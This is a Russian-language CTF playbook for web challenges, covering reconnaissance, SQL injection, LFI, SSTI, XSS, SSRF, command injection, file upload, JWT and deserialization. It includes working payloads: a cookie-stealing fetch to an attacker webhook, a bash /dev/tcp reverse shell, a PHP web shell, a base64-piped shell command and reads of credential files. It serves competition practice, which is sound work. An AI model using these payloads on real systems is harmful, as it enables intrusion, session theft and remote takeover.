# WEB — процедура

> Сопровождающие команды: `CTF_CHEATSHEET.md` → раздел WEB.
> Автоматика: `enum-web <url>` (fingerprint → low-hanging → dirsearch → vhost/subs).

## 0. Подготовка

```bash
enum-web http://target          # весь первый проход, вывод в loot/
```
Пока скрипт работает — открой сайт в браузере с Burp/DevTools как прокси.

## 1. Понять приложение (5 минут)

1. Главная, все ссылки, все формы.
2. DevTools → Network: какие запросы уходят, какие параметры, cookies, JWT.
3. `curl -sI` → заголовки, сервер, `X-Powered-By`.
4. `whatweb`, `wafw00f` (есть WAF?).
5. Исходники страниц + `*.js` (ищи API-роуты, скрытые поля, ключи).
6. `robots.txt`, `sitemap.xml`, `/.git/`, `/.env`, `/backup.zip`, `/.well-known/`.

## 2. Карта входных точек

Составь список всего, куда можно влиять:

- GET/POST параметры, JSON-тела, заголовки (`X-Forwarded-For`, `User-Agent`, `Host`),
- cookies / JWT, `?file=`, `?url=`, `?id=`, `?template=`, загрузка файлов,
- API: `/api/...`, GraphQL (`/graphql` → introspection).

Правило: **каждый параметр — потенциальная уязвимость**, идём по списку.

## 3. Ветки по признакам

### 3.1 SQL-инъекция
Признаки: числовые `id`, логин, поиск, сортировка, «ошибка 500 на кавычку».
1. Ручные: `' OR '1'='1`, `admin'-- -`, `1 UNION SELECT NULL-- -` (см. cheatsheet).
2. `sqlmap -u "<url с параметром>" --batch --level=3 --risk=2 --dbs`.
3. Запрос из Burp сохрани в `request.txt` → `sqlmap -r request.txt -p <param> --dbs`.
4. Не видно вывода → time-based: `--technique=T`, слепая по `SLEEP`.
5. Есть WAF → `--tamper=space2comment,charencode`.

### 3.2 LFI / path traversal
Признаки: `?file=`, `?page=`, `?lang=`, `?template=`, скачивание отчётов.
1. `?file=../../../../etc/passwd`, обходы (`....//`, URL-encode, двойной encode).
2. Чтение кода: `php://filter/convert.base64-encode/resource=index.php`.
3. Логи → RCE: `php://input`, `/proc/self/environ`, `/var/log/nginx/access.log`.
4. Быстрая проверка: `?file=/etc/passwd` вернул содержимое → ищи что ещё читается
   (`.ssh/id_rsa`, `config.php`, `.env`, `docker-compose.yml`).
5. PHP-цепочки фильтров → генератор filter chain (cheatsheet).

### 3.3 SSTI
Признаки: шаблон в письме/странице/имени пользователя, «Hello {{name}}».
1. Тест: `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `@(7*7)`.
2. Определи движок (Jinja2/Twig/Velocity/Freemarker).
3. Jinja2 → RCE через `''.__class__.__mro__[1].__subclasses__()` (cheatsheet).

### 3.4 XSS
Признаки: отражение ввода, пользовательские поля, «админ увидит»/бот есть.
1. Проверь контекст: HTML, атрибут, JS-строка, URL.
2. Начни с `<script>alert(1)</script>`, потом обходы и `<img src=x onerror=...>`.
3. Кража: `fetch('http://<ваш webhook>/?c='+document.cookie)`.
4. Бот: смотри `robots.txt`, `/report`, форму репорта — это таргет-URL.

### 3.5 SSRF
Признаки: параметр с URL (`?url=`, `?image=`, импорт по ссылке, webhook).
1. `http://127.0.0.1/admin`, `http://localhost:PORT`, обходы фильтров
   (`127.1`, `2130706433`, `0x7f000001`, `[::1]`, `DNS rebinding`).
2. Облако: `http://169.254.169.254/latest/meta-data/`.
3. Внутренние сервисы: `gopher://` → Redis/MySQL (см. cheatsheet).

### 3.6 Command injection
Признаки: ping/traceroute/конвертация файлов, «системная» функциональность.
1. `; id`, `| id`, `$(id)`, `` `id` ``, `%0a id`.
2. Обход фильтров: `${IFS}`, `$（）`-трюки, base64:
   `echo aWQ=|base64 -d|sh`.
3. Reverse shell: `bash -i >& /dev/tcp/<ip>/4444 0>&1`, слушай `listen 4444`.

### 3.7 File upload
1. Ограничения: расширение, MIME (`Content-Type`), магические байты, размер.
2. Обходы: `.phtml/.php5/.php7/.pHp`, `shell.php.jpg`, `.htaccess` → `AddType`.
3. Проверь, где файл доступен и как исполняется (`/uploads/`).
4. Содержимое: `<?php system($_GET['c']); ?>`.

### 3.8 JWT / авторизация
1. Разбери токен: header (alg), payload (role, user).
2. `alg=none`, слабый секрет (`jwt_tool -C -d rockyou.txt`), RS256→HS256.
3. IDOR: меняй `id`, `user_id`, `uuid`; проверь `/api/user/2`.

### 3.9 Десериализация / race condition
- PHP: `phpggc`, Java: `ysoserial`, Python pickle: `__reduce__`.
- Гонка: Burp Turbo Intruder / `ffuf -t 50` на «одноразовые» действия (купоны, баланс).

## 4. Инструменты по ситуации

```bash
dirsearch -u http://target -e php,txt,html,bak,zip,git     # есть в enum-web
ffuf -u http://target/FUZZ -w <wordlist> -mc all -fc 404
feroxbuster -u http://target -w <wordlist> -x php,txt
gobuster vhost -u http://target -w <dns wordlist>
nuclei -u http://target -t http/                           # быстрый скан шаблонов
```

## 5. Финал

1. Флаг найден → проверь формат и отсутствие пробелов.
2. Запиши на странице задания в Notion финальную цепочку: параметр → payload → ответ.
3. Сохрани рабочий скрипт в `scripts/` (curl/python/Burp-проект).
4. Не забыть: если флаг в исходнике — это тоже решение, но райтап требует шагов.

## Типовые грабли

- `dirsearch` без `-e` не найдёт файлы с расширениями.
- WAF может отдавать 403 на «плохие» слова — меняй регистр/кодирование.
- Не тестируй ничего вне выданного таргета (правила соревнования).
